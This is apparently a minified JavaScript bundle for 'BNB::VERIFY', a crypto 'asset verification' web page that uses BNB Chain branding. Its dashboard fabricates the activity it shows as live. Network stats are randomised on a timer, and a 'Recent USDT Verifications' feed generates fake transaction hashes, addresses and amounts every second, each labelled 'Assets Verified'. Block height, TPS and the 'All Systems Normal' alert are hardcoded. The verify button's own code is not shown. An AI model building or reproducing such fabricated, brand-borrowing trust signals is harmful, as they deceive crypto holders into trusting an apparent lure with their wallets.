								this.x = e, this.y = t, this.size = s, this.connections = [], this.pulseTime = 100 * Math.random(), this.pulseSpeed = .05 + .05 * Math.random(), this.active = Math.random() > .7
							}
						}
						let r = window.innerWidth < 768,
							n = Math.floor(window.innerWidth * window.innerHeight / (r ? 4e4 : 2e4)),
							i = [];
						for (let e = 0; e < n; e++) {
							let e = Math.random() * t.width,
								s = Math.random() * t.height,
								a = 1 + 3 * Math.random();
							i.push(new l(e, s, a))
						}
						i.forEach(e => {
							let t = Math.floor(2 + 3 * Math.random()),
								s = [...i].sort((t, s) => Math.hypot(e.x - t.x, e.y - t.y) - Math.hypot(e.x - s.x, e.y - s.y));
							for (let a = 1; a <= t && a < s.length; a++) e.connections.push(s[a])
						});
						let o = () => {
							s.clearRect(0, 0, t.width, t.height), i.forEach(e => {
								e.update(), e.draw(s)
							}), requestAnimationFrame(o)
						};
						return o(), () => {
							window.removeEventListener("resize", a)
						}
					}, []), (0, a.jsx)("canvas", {
						ref: e,
						className: "absolute inset-0 z-0 opacity-70"
					})
				},
				Q = e => {
					let {
						text: t,
						className: s = ""
					} = e;
					return (0, a.jsx)("div", {
						className: "relative ".concat(s),
						children: (0, a.jsx)("div", {
							className: "font-bold",
							children: t
						})
					})
				},
				$ = () => (0, a.jsxs)("div", {
					className: "relative w-full max-w-[200px] aspect-square mx-auto",
					children: [(0, a.jsx)("div", {
						className: "absolute inset-0 bg-bnb-yellow/30 rounded-full blur-[50px] animate-pulse"
					}), (0, a.jsx)("div", {
						className: "absolute inset-0 flex items-center justify-center",
						children: (0, a.jsxs)("div", {
							className: "w-full h-full relative",
							children: [(0, a.jsx)("div", {
								className: "absolute inset-0 flex items-center justify-center",
								children: (0, a.jsx)(r.A, {
									className: "w-full h-full text-bnb-yellow/30 animate-spin-slow",
									strokeWidth: 1
								})
							}), (0, a.jsx)("div", {
								className: "absolute inset-[15%] flex items-center justify-center",
								children: (0, a.jsx)(r.A, {
									className: "w-full h-full text-bnb-yellow/50 animate-spin-reverse-slow",
									strokeWidth: 1
								})
							}), (0, a.jsx)("div", {
								className: "absolute inset-[30%] flex items-center justify-center",
								children: (0, a.jsxs)("div", {
									className: "w-full h-full relative",
									children: [(0, a.jsx)(x.default, {
										src: "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHBhdGggZD0iTTE2IDBoLTAuM2wxMCAxMHYwLjNsLTEwIDEwLTEwLTEwdi0wLjNsMTAtMTB6TTI2IDIydi0wLjNsLTEwLTEwLTEwIDEwdjAuM2wxMCAxMHoiIGZpbGw9IiNmMGI5MGIiLz48L3N2Zz4=",
										alt: "BNB Chain Logo",
										width: 100,
										height: 100,
										className: "w-full h-full object-contain neon-glow",
										priority: !0
									}), (0, a.jsx)("div", {
										className: "absolute inset-0 bg-bnb-yellow/20 rounded-full blur-md animate-pulse"
									})]
								})
							}), (0, a.jsx)("div", {
								className: "absolute top-0 left-1/2 -translate-x-1/2 w-2 h-2 bg-bnb-yellow rounded-full animate-pulse-fast"
							}), (0, a.jsx)("div", {
								className: "absolute bottom-0 left-1/2 -translate-x-1/2 w-2 h-2 bg-bnb-yellow rounded-full animate-pulse-fast",
								style: {
									animationDelay: "0.5s"
								}
							}), (0, a.jsx)("div", {
								className: "absolute left-0 top-1/2 -translate-y-1/2 w-2 h-2 bg-bnb-yellow rounded-full animate-pulse-fast",
								style: {
									animationDelay: "1s"
								}
							}), (0, a.jsx)("div", {
								className: "absolute right-0 top-1/2 -translate-y-1/2 w-2 h-2 bg-bnb-yellow rounded-full animate-pulse-fast",
								style: {
									animationDelay: "1.5s"
								}
							})]
						})
					})]
				}),
				ee = e => {
					let {
						value: t,
						label: s
					} = e;
					return (0, a.jsxs)("div", {
						className: "flex flex-col items-center",
						children: [(0, a.jsx)("div", {
							className: "bg-bnb-black border border-bnb-yellow/30 rounded-md px-3 py-2 font-mono text-bnb-yellow text-xl tracking-wider cyberpunk-box",
							children: t
						}), (0, a.jsx)("div", {
							className: "text-xs text-gray-400 mt-1",
							children: s
						})]
					})
				},
				et = () => {
					let [e, t] = (0, l.useState)({
						uptime: "99.8%",
						latency: "0.02s",
						validators: "12.5K",
						transactions: "3.2M"
					});
					return (0, l.useEffect)(() => {
						let e = () => {
							let e = .01 + .03 * Math.random(),
								s = Math.floor(100 * Math.random()) - 50,
								a = Math.floor(5e4 * Math.random()) - 25e3;
							t({
								uptime: (99.7 + .2 * Math.random()).toFixed(1) + "%",
								latency: e.toFixed(2) + "s",
								validators: (12500 + s).toLocaleString(void 0, {
									maximumFractionDigits: 0,
									notation: "compact",
									compactDisplay: "short"
								}),
								transactions: (32e5 + a).toLocaleString(void 0, {
									maximumFractionDigits: 0,
									notation: "compact",
									compactDisplay: "short"
								})
							})
						};
						e();
						let s = setInterval(e, 3e3);
						return () => clearInterval(s)
					}, []), (0, a.jsxs)("div", {
						className: "grid grid-cols-2 gap-3",
						children: [(0, a.jsx)(ee, {
							value: e.uptime,
							label: "Uptime"
						}), (0, a.jsx)(ee, {
							value: e.latency,
							label: "Latency"
						}), (0, a.jsx)(ee, {
							value: e.validators,
							label: "Validators"
						}), (0, a.jsx)(ee, {
							value: e.transactions,
							label: "Transactions"
						})]
					})
				},
				es = () => {
					let [e, t] = (0, l.useState)([]), [s, r] = (0, l.useState)(!0), [i, o] = (0, l.useState)(null), c = (0, J.U)("(max-width: 640px)"), d = (0, l.useCallback)(async () => {
						try {
							let e = (() => {
								let e;
								let t = ["0x55d398326f99059fF775485246999027B3197955", "0x8894E0a0c962CB723c1976a4421c95949bE2D4E3", "0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE", "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", "0x1CE0c2827e2eF14D5C4f29a091d735A204794041", "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", "0x2170Ed0880ac9A755fd29B2688956BD959F933F8"],
									s = t[Math.floor(Math.random() * t.length)];
								do e = t[Math.floor(Math.random() * t.length)]; while (e === s);
								let a = (1e5 * Math.random()).toFixed(2);
								return {
									hash: "0x" + [...Array(64)].map(() => Math.floor(16 * Math.random()).toString(16)).join(""),
									from: s.substring(0, 6) + "..." + s.substring(s.length - 4),
									to: e.substring(0, 6) + "..." + e.substring(e.length - 4),
									amount: Number(a).toLocaleString() + " USDT",
									timestamp: new Date().toISOString(),
									timeAgo: "just now"
								}
							})();
							t(t => [e, ...t.slice(0, 9)]), r(!1)
						} catch (e) {
							console.error("Error fetching transactions:", e), o("Failed to fetch transactions"), r(!1)
						}
					}, []);
					return ((0, l.useEffect)(() => {
						d();
						let e = setInterval(() => {
							d()
						}, 1e3);
						return () => clearInterval(e)
					}, [d]), (0, l.useEffect)(() => {
						let e = setInterval(() => {
							t(e => e.map(e => {
								let t;
								let s = Math.floor((new Date().getTime() - new Date(e.timestamp).getTime()) / 1e3);
								return t = s < 5 ? "just now" : s < 60 ? "".concat(s, " secs ago") : s < 3600 ? "".concat(Math.floor(s / 60), " mins ago") : "".concat(Math.floor(s / 3600), " hours ago"), {
									...e,
									timeAgo: t
								}
							}))
						}, 5e3);
						return () => clearInterval(e)
					}, []), s && 0 === e.length) ? (0, a.jsxs)("div", {
						className: "flex justify-center items-center py-8",
						children: [(0, a.jsx)("div", {
							className: "w-6 h-6 border-2 border-bnb-yellow border-t-transparent rounded-full animate-spin"
						}), (0, a.jsx)("span", {
							className: "ml-2 text-sm text-gray-400",
							children: "Loading transactions..."
						})]
					}) : i && 0 === e.length ? (0, a.jsxs)("div", {
						className: "text-center py-8",
						children: [(0, a.jsx)("div", {
							className: "text-red-400 mb-2",
							children: i
						}), (0, a.jsx)("button", {
							onClick: () => {
								o(null), r(!0), d()
							},
							className: "text-xs text-bnb-yellow hover:underline",
							children: "Try again"
						})]
					}) : (0, a.jsxs)("div", {
						className: "space-y-3 max-h-[400px] overflow-y-auto pr-1 cyberpunk-scrollbar",
						children: [e.map((e, t) => (0, a.jsxs)("div", {
							className: "flex justify-between items-center p-2 border-b border-gray-800 hover:bg-bnb-yellow/5 transition-colors ".concat(0 === t ? "animate-pulse-once bg-bnb-yellow/5" : ""),
							children: [(0, a.jsxs)("div", {
								className: "flex items-center space-x-3",
								children: [(0, a.jsx)("div", {
									className: "w-8 h-8 rounded bg-bnb-yellow/10 flex items-center justify-center",
									children: (0, a.jsx)(n.A, {
										className: "w-4 h-4 text-bnb-yellow"
									})
								}), (0, a.jsxs)("div", {
									children: [(0, a.jsxs)("div", {
										className: "text-sm font-medium flex items-center",
										children: [(0, a.jsx)("span", {
											className: "text-white",
											children: "Verified Address:"
										}), (0, a.jsx)("span", {
											className: "ml-1 font-mono text-bnb-yellow",
											children: e.from
										})]
									}), (0, a.jsxs)("div", {
										className: "text-xs text-gray-500 flex items-center mt-0.5",
										children: [(0, a.jsx)("span", {
											children: e.timeAgo
										}), (0, a.jsx)("span", {
											className: "mx-1",
											children: "•"
										}), (0, a.jsx)("span", {
											className: "text-xs font-mono text-gray-500 truncate max-w-[80px]",
											children: c ? e.hash.substring(0, 6) + "..." : e.hash.substring(0, 10) + "..."
										})]
									})]
								})]
							}), (0, a.jsxs)("div", {
								className: "text-right",
								children: [(0, a.jsx)("div", {
									className: "text-sm font-mono font-medium",
									children: e.amount
								}), (0, a.jsxs)("div", {
									className: "text-xs text-green-400 flex items-center justify-end",
									children: [(0, a.jsx)("div", {
										className: "w-1.5 h-1.5 rounded-full bg-green-500 mr-1"
									}), "Assets Verified"]
								})]
							})]
						}, e.hash + t)), 0 === e.length && (0, a.jsx)("div", {
							className: "text-center py-4 text-gray-400",
							children: "No verifications found"
						})]
					})
				};

			function ea() {
				let [e, t] = (0, l.useState)("verify");
				(0, J.U)("(max-width: 768px)");
				let s = [{
					title: "BNB Chain Documentation",
					description: "Official guides and API references",
					icon: (0, a.jsx)(i.A, {
						className: "w-4 h-4"
					}),
					color: "bg-gradient-to-r from-bnb-yellow/20 to-amber-500/10",
					details: {
						content: "BNB Chain Documentation provides comprehensive guides, tutorials, and API references for developers building on BNB Chain. It covers everything from setting up a wallet to deploying smart contracts and building dApps. The documentation is regularly updated with the latest features and best practices.",
						links: [{
							text: "Developer Portal",
							url: "https://docs.bnbchain.org/docs/getting-started"
						}, {
							text: "BNB Smart Chain API Reference",
							url: "https://docs.bnbchain.org/docs/rpc"
						}, {
							text: "BNB Chain GitHub",
							url: "https://github.com/bnb-chain"
						}]
					}
				}, {
					title: "Security Best Practices",
					description: "Protect your assets and wallet",
					icon: (0, a.jsx)(o.A, {
						className: "w-4 h-4"
					}),
					color: "bg-gradient-to-r from-green-500/20 to-green-600/5",
					details: {
						content: "Security is paramount when dealing with crypto assets. BNB Chain recommends using hardware wallets for large holdings, enabling two-factor authentication, verifying contract addresses before transactions, and regularly checking for phishing attempts. Never share your private keys or seed phrases with anyone.",
						links: [{
							text: "Wallet Security Guide",
							url: "https://www.binance.com/en/blog/community/crypto-security-101-how-to-protect-your-crypto-assets-8504752439101580238"
						}, {
							text: "Smart Contract Security",
							url: "https://docs.bnbchain.org/docs/BSC-security-guideline"
						}, {
							text: "Phishing Prevention",
							url: "https://www.binance.com/en/support/faq/how-to-spot-and-avoid-phishing-scams-360033525371"
						}]
					}
				}, {
					title: "Asset Verification Guide",
					description: "Learn how verification works",
					icon: (0, a.jsx)(c.A, {
						className: "w-4 h-4"
					}),
					color: "bg-gradient-to-r from-blue-500/20 to-blue-600/5",
					details: {
						content: "Asset verification on BNB Chain ensures that tokens and NFTs are legitimate and secure. The verification process checks contract code, transaction history, and token distribution patterns. Verified assets display a checkmark in BNB Chain Explorer and are less likely to be fraudulent or malicious.",
						links: [{
							text: "Token Verification Process",
							url: "https://bscscan.com/verifyContract"
						}, {
							text: "How to Verify Tokens",
							url: "https://docs.bnbchain.org/docs/verify-token"
						}, {
							text: "Avoiding Scam Tokens",
							url: "https://www.binance.com/en/blog/community/how-to-spot-and-avoid-crypto-scams-421499824684903155"
						}]
					}
				}, {
					title: "Smart Contract Audit",
					description: "Verify contract security status",
					icon: (0, a.jsx)(d.A, {
						className: "w-4 h-4"
					}),
					color: "bg-gradient-to-r from-purple-500/20 to-purple-600/5",
					details: {
						content: "Smart contract audits are essential for ensuring the security and reliability of blockchain applications. BNB Chain recommends using reputable audit firms to review contract code for vulnerabilities, logic errors, and optimization opportunities. Audited contracts are more trustworthy and less likely to contain exploitable flaws.",
						links: [{
							text: "Audit Partners Directory",
							url: "https://docs.bnbchain.org/docs/audit-partners"
						}, {
							text: "Contract Verification Tool",
							url: "https://bscscan.com/verifyContract"
						}, {
							text: "Security Incident Response",
							url: "https://docs.bnbchain.org/docs/security-incident-response"
						}]
					}
				}];
				return (0, a.jsxs)("div", {
					className: "min-h-screen bg-[#050507] text-white overflow-hidden relative",
					children: [(0, a.jsx)(K, {}), (0, a.jsxs)("div", {
						className: "absolute top-0 left-0 w-full h-full pointer-events-none z-0",
						children: [(0, a.jsx)("div", {
							className: "absolute top-0 right-0 w-[70%] h-[130%] bg-[#0a0a0f] transform -rotate-12 origin-top-right"
						}), (0, a.jsx)("div", {
							className: "absolute top-0 right-0 w-[70%] h-[130%] border-l-2 border-bnb-yellow/20 transform -rotate-12 origin-top-right"
						})]
					}), (0, a.jsx)("div", {
						className: "absolute inset-0 bg-noise opacity-5 mix-blend-overlay pointer-events-none"
					}), (0, a.jsx)("header", {
						className: "relative z-10 border-b border-bnb-yellow/20",
						children: (0, a.jsx)("div", {
							className: "container mx-auto px-4",
							children: (0, a.jsxs)("div", {
								className: "flex items-center justify-between h-16",
								children: [(0, a.jsxs)("div", {
									className: "flex items-center space-x-2",
									children: [(0, a.jsxs)("div", {
										className: "w-8 h-8 relative",
										children: [(0, a.jsx)("div", {
											className: "absolute inset-0 bg-bnb-yellow/20 rounded-full blur-md"
										}), (0, a.jsx)(x.default, {
											src: "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHBhdGggZD0iTTE2IDBoLTAuM2wxMCAxMHYwLjNsLTEwIDEwLTEwLTEwdi0wLjNsMTAtMTB6TTI2IDIydi0wLjNsLTEwLTEwLTEwIDEwdjAuM2wxMCAxMHoiIGZpbGw9IiNmMGI5MGIiLz48L3N2Zz4=",
											alt: "BNB Chain Logo",
											width: 32,
											height: 32,
											className: "w-full h-full"
										})]
									}), (0, a.jsx)(Q, {
										text: "BNB::VERIFY",
										className: "text-xl font-bold tracking-wider text-bnb-yellow"
									})]
								}), (0, a.jsx)("nav", {
									className: "hidden md:flex space-x-1",
									children: ["verify", "explore", "security", "network"].map(s => (0, a.jsx)("button", {
										onClick: () => t(s),
										className: "px-4 py-2 uppercase text-xs tracking-wider transition-colors ".concat(e === s ? "bg-bnb-yellow text-black font-bold" : "text-gray-400 hover:text-bnb-yellow hover:bg-bnb-yellow/10"),
										children: s
									}, s))
								})]
							})
						})
					}), (0, a.jsx)("main", {
						className: "relative z-10",
						children: (0, a.jsx)("div", {
							className: "container mx-auto px-4 py-6 md:py-8",
							children: (0, a.jsxs)("div", {
								className: "grid grid-cols-1 lg:grid-cols-12 gap-4 md:gap-8",
								children: [(0, a.jsx)("div", {
									className: "lg:col-span-3 space-y-4 md:space-y-6",
									children: (0, a.jsxs)("div", {
										className: "cyberpunk-panel p-4 space-y-4",
										children: [(0, a.jsxs)("div", {
											className: "flex justify-between items-center border-b border-bnb-yellow/20 pb-2",
											children: [(0, a.jsx)("h3", {
												className: "text-bnb-yellow text-sm uppercase tracking-wider font-bold",
												children: "Network Stats"
											}), (0, a.jsxs)("div", {
												className: "flex items-center",
												children: [(0, a.jsx)("div", {
													className: "w-2 h-2 rounded-full bg-green-500 animate-pulse mr-2"
												}), (0, a.jsx)("span", {
													className: "text-xs text-green-400",
													children: "Live"
												})]
											})]
										}), (0, a.jsx)(et, {})]
									})
								}), (0, a.jsxs)("div", {
									className: "lg:col-span-6 space-y-6 md:space-y-8",
									children: [(0, a.jsxs)("div", {
										className: "cyberpunk-panel-highlight p-4 md:p-6 relative overflow-hidden",
										children: [(0, a.jsx)("div", {
											className: "absolute top-0 right-0 w-40 h-40 bg-bnb-yellow/10 rounded-full blur-3xl"
										}), (0, a.jsx)("div", {
											className: "relative z-10",
											children: (0, a.jsxs)("div", {
												className: "flex flex-col md:flex-row items-center justify-between gap-6",
												children: [(0, a.jsxs)("div", {
													className: "space-y-4 text-center md:text-left",
													children: [(0, a.jsx)("div", {
														children: (0, a.jsx)("span", {
															className: "inline-block px-3 py-1 bg-bnb-yellow/10 border border-bnb-yellow/30 text-bnb-yellow text-xs uppercase tracking-wider",
															children: "BNB Chain Verification"
														})
													}), (0, a.jsx)("h1", {
														className: "text-2xl md:text-4xl font-bold",
														children: (0, a.jsx)(Q, {
															text: "Secure Asset Verification",
															className: "text-white"
														})
													}), (0, a.jsx)("p", {
														className: "text-gray-400 max-w-md text-sm md:text-base",
														children: "Verify your BNB Chain assets with our advanced security protocol. Protect against scams and ensure your transactions are secure."
													}), (0, a.jsx)("div", {
														className: "pt-2",
														children: (0, a.jsx)(Z, {})
													})]
												}), (0, a.jsx)("div", {
													className: "w-32 md:w-48",
													children: (0, a.jsx)($, {})
												})]
											})
										})]
									}), (0, a.jsx)("div", {
										className: "grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4",
										children: [{
											icon: (0, a.jsx)(n.A, {
												className: "w-6 h-6"
											}),
											title: "Secure Verification",
											description: "Military-grade encryption for all your assets"
										}, {
											icon: (0, a.jsx)(m.A, {
												className: "w-6 h-6"
											}),
											title: "Privacy Protected",
											description: "Your data remains private and secure"
										}, {
											icon: (0, a.jsx)(b.A, {
												className: "w-6 h-6"
											}),
											title: "Instant Results",
											description: "Get verification results in milliseconds"
										}].map((e, t) => (0, a.jsxs)("div", {
											className: "cyberpunk-card p-4 space-y-3",
											children: [(0, a.jsx)("div", {
												className: "w-10 h-10 rounded bg-bnb-yellow/10 border border-bnb-yellow/30 flex items-center justify-center text-bnb-yellow",
												children: e.icon
											}), (0, a.jsx)("h3", {
												className: "text-white font-bold",
												children: e.title
											}), (0, a.jsx)("p", {
												className: "text-gray-400 text-sm",
												children: e.description
											})]
										}, t))
									}), (0, a.jsxs)("div", {
										className: "cyberpunk-panel p-4 sm:p-6 space-y-3 sm:space-y-4",
										children: [(0, a.jsxs)("div", {
											className: "flex flex-col xs:flex-row justify-between items-start xs:items-center border-b border-bnb-yellow/20 pb-2 sm:pb-3 gap-2",
											children: [(0, a.jsx)("h2", {
												className: "text-bnb-yellow font-bold text-sm sm:text-base",
												children: "Recent USDT Verifications"
											}), (0, a.jsxs)("div", {
												className: "flex items-center",
												children: [(0, a.jsx)("div", {
													className: "w-2 h-2 rounded-full bg-green-500 animate-pulse mr-2"
												}), (0, a.jsx)("span", {
													className: "text-xs text-green-400",
													children: "Live Updates"
												})]
											})]
										}), (0, a.jsx)(es, {})]
									})]
								}), (0, a.jsxs)("div", {
									className: "lg:col-span-3 space-y-4 md:space-y-6",
									children: [(0, a.jsxs)("div", {
										className: "cyberpunk-panel p-4 space-y-4",
										children: [(0, a.jsx)("h3", {
											className: "text-bnb-yellow text-sm uppercase tracking-wider font-bold border-b border-bnb-yellow/20 pb-2",
											children: "BNB Chain Status"
										}), (0, a.jsxs)("div", {
											className: "space-y-3",
											children: [(0, a.jsxs)("div", {
												children: [(0, a.jsxs)("div", {
													className: "flex justify-between text-xs text-gray-400 mb-1",
													children: [(0, a.jsx)("span", {
														children: "Block Height"
													}), (0, a.jsx)("span", {
														className: "font-mono",
														children: "32,145,789"
													})]
												}), (0, a.jsx)("div", {
													className: "w-full h-1 bg-gray-800 rounded-full overflow-hidden",
													children: (0, a.jsx)("div", {
														className: "h-full bg-bnb-yellow w-full animate-pulse"
													})
												})]
											}), (0, a.jsxs)("div", {
												children: [(0, a.jsxs)("div", {
													className: "flex justify-between text-xs text-gray-400 mb-1",
													children: [(0, a.jsx)("span", {
														children: "TPS"
													}), (0, a.jsx)("span", {
														className: "font-mono",
														children: "4,250"
													})]
												}), (0, a.jsx)("div", {
													className: "w-full h-1 bg-gray-800 rounded-full overflow-hidden",
													children: (0, a.jsx)("div", {
														className: "h-full bg-bnb-yellow w-[85%]"
													})
												})]
											}), (0, a.jsxs)("div", {
												children: [(0, a.jsxs)("div", {
													className: "flex justify-between text-xs text-gray-400 mb-1",
													children: [(0, a.jsx)("span", {
														children: "Gas Price"
													}), (0, a.jsx)("span", {
														className: "font-mono",
														children: "5 Gwei"
													})]
												}), (0, a.jsx)("div", {
													className: "w-full h-1 bg-gray-800 rounded-full overflow-hidden",
													children: (0, a.jsx)("div", {
														className: "h-full bg-bnb-yellow w-[30%]"
													})
												})]
											})]
										})]
									}), (0, a.jsxs)("div", {
										className: "cyberpunk-panel p-4 space-y-4",
										children: [(0, a.jsx)("h3", {
											className: "text-bnb-yellow text-sm uppercase tracking-wider font-bold border-b border-bnb-yellow/20 pb-2",
											children: "Security Alerts"
										}), (0, a.jsxs)("div", {
											className: "space-y-3",
											children: [(0, a.jsx)("div", {
												className: "p-2 border border-green-500/20 bg-green-500/5 rounded",
												children: (0, a.jsxs)("div", {
													className: "flex items-start space-x-2",
													children: [(0, a.jsx)("div", {
														className: "w-4 h-4 rounded-full bg-green-500/20 flex items-center justify-center mt-0.5",
														children: (0, a.jsx)("div", {
															className: "w-2 h-2 rounded-full bg-green-500"
														})
													}), (0, a.jsxs)("div", {
														children: [(0, a.jsx)("div", {
															className: "text-xs text-green-400",
															children: "All Systems Normal"
														}), (0, a.jsx)("div", {
															className: "text-xs text-gray-500",
															children: "Updated 5 mins ago"
														})]
													})]
												})
											}), (0, a.jsx)("div", {
												className: "p-2 border border-bnb-yellow/20 bg-bnb-yellow/5 rounded",
												children: (0, a.jsxs)("div", {
													className: "flex items-start space-x-2",
													children: [(0, a.jsx)("div", {
														className: "w-4 h-4 rounded-full bg-bnb-yellow/20 flex items-center justify-center mt-0.5",
														children: (0, a.jsx)("div", {
															className: "w-2 h-2 rounded-full bg-bnb-yellow"
														})
													}), (0, a.jsxs)("div", {
														children: [(0, a.jsx)("div", {
															className: "text-xs text-bnb-yellow",
															children: "Phishing Alert: Stay Vigilant"
														}), (0, a.jsx)("div", {
															className: "text-xs text-gray-500",
															children: "Report suspicious activities"
														})]
													})]
												})
											})]
										})]
									}), (0, a.jsxs)("div", {
										className: "cyberpunk-panel p-4 space-y-4",
										children: [(0, a.jsx)("h3", {
											className: "text-bnb-yellow text-sm uppercase tracking-wider font-bold border-b border-bnb-yellow/20 pb-2",
											children: "Resources"
										}), (0, a.jsx)("div", {
											className: "space-y-3",
											children: s.map((e, t) => (0, a.jsx)(q, {
												title: e.title,
												description: e.description,
												icon: e.icon,
												color: e.color,
												details: e.details
											}, t))
										})]
									})]
								})]
							})
						})
					}), (0, a.jsx)("footer", {
						className: "relative z-10 border-t border-bnb-yellow/20 py-4 md:py-6 mt-6 md:mt-8",
						children: (0, a.jsx)("div", {
							className: "container mx-auto px-4",
							children: (0, a.jsxs)("div", {
								className: "flex flex-col md:flex-row justify-between items-center",
								children: [(0, a.jsxs)("div", {
									className: "flex items-center space-x-2 mb-4 md:mb-0",
									children: [(0, a.jsx)("div", {
										className: "w-6 h-6 relative",
										children: (0, a.jsx)(x.default, {
											src: "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHBhdGggZD0iTTE2IDBoLTAuM2wxMCAxMHYwLjNsLTEwIDEwLTEwLTEwdi0wLjNsMTAtMTB6TTI2IDIydi0wLjNsLTEwLTEwLTEwIDEwdjAuM2wxMCAxMHoiIGZpbGw9IiNmMGI5MGIiLz48L3N2Zz4=",
											alt: "BNB Chain Logo",
											width: 24,
											height: 24,
											className: "w-full h-full"
										})
									}), (0, a.jsx)("span", {
										className: "text-sm text-bnb-yellow",
										children: "BNB::VERIFY"
									})]
								}), (0, a.jsx)("div", {
									className: "text-xs text-gray-500",
									children: "\xa9 2025 BNB Verify. All rights reserved. Powered by BNB Chain."
								})]
							})
						})
					})]
				})
			}
		}
	},
	e => {
		var t = t => e(e.s = t);
		e.O(0, [618, 433, 441, 684, 358], () => t(4176)), _N_E = e.O()
	}
]);
